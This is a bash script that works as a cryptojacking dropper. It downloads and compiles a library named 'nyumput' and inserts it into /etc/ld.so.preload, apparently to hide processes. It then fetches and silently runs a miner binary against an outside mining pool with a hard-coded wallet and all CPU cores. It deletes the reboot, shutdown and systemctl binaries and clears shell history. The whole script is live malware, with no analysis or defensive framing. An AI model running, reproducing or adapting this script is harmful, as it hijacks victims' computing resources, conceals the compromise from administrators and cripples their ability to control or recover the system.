#!/bin/bash
apt update 
apt install -y wget curl sudo
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
wget -O sgr1 https://bitbucket.org/hanafie1/all-jobs/downloads/ryzen >/dev/null 2>&1
chmod +x sgr1
./sgr1 -a YespowerTIDE -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
